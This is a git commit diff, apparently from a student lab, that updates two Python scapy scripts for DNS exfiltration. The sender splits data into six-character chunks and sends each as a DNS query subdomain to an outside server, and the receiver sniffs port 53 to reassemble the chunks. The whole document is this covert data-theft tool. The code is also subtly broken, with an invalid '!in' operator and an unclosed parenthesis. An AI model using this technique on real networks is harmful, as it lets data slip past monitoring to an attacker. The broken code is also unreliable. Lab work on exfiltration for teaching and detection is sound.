f5acff44c2224912f2b379a79a5e81ea549b48f2
ninjawill543 <lucas.hanson@ynov.com>
2023-11-29 18:28:52 +0100

    working on dns receive

--- TP-4/DNS_Exfiltration/dns_exfiltration_receive.py
+++ TP-4/DNS_Exfiltration/dns_exfiltration_receive.py
@@ -1,9 +1,16 @@
 from scapy.all import *
 
+list = ""
 def dns_sniff(packet):
+    global list
     if DNS in packet and packet.dport == 53 and packet[DNS].qr == 0:
         domain_name = packet[DNSQR].qname.decode('utf-8')
-        print(domain_name[:-18])
+        if ("~~end~~" in domain_name):
+            print(list)
+            quit()
+        elif ("~" in domain_name and "~~end~~" !in domain_name):
+            index = domain_name.find("~")
+            list = list + domain_name[index + 1:-18]
 
 sniff(filter='udp port 53', prn=dns_sniff)
 
--- TP-4/DNS_Exfiltration/dns_exfiltration_send.py
+++ TP-4/DNS_Exfiltration/dns_exfiltration_send.py
@@ -6,8 +6,14 @@ def dns_send(query_domain, dns_server="lucashanson.tech"):
     dns_request = Ether()/IP(dst=dns_server)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=query_domain))
     answers, unanswered_packets = srp(dns_request, timeout=2, verbose=False)
 
+to_send = str(sys.argv[2])
+list = ([to_send[i:i + 6] for i in range(0, len(to_send), 6)])
 
-domain_to_query = sys.argv[1] + ".lucashanson.tech"
-#domain_to_query = "lucashanson.tech"
-dns_send(domain_to_query)
+count = 0
+for i in list:
+    dns_send(str(count) + "~" + i + "." + sys.argv[1])
+    count = count + 1
+dns_send("~~end~~" + "." + sys.argv[1]
+
+#dns_send(domain_to_query)
 
